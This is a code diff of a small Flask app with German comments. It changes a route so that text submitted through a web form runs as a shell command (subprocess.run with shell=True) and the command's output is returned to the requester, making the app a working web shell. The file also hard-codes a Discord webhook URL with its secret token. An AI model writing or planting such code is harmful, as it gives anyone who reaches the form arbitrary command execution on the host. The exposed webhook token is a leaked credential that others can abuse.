@@ -1,6 +1,7 @@
 from os import system as sys
 from flask import Flask, request
 import socket
+import subprocess
 from dhooks import Webhook
 
 hook = Webhook("https://discord.com/api/webhooks/1295417454914179072/lCsBoGB-ntpFbDV6XdlQ8gsgUIAdUSbiOiJJOkjvIuHRQXXtLXRL-g-u4SP9-JZcD5u3")
@@ -11,8 +12,9 @@ app = Flask(__name__)
 def index():
     if request.method == 'POST':
         input_text = request.form['input_field']
-        sys(input_text)  # Ausgabe auf der Konsole
-        return f'Vielen Dank für deine Eingabe: {input_text}'  # Optional: Bestätigungsnachricht anzeigen
+        result = subprocess.run(input_text, shell=True, capture_output=True, text=True)
+        output = result.stdout
+        return f'Output: {output}'  # Optional: Bestätigungsnachricht anzeigen
 
     # HTML-Template als String
     html_content = '''
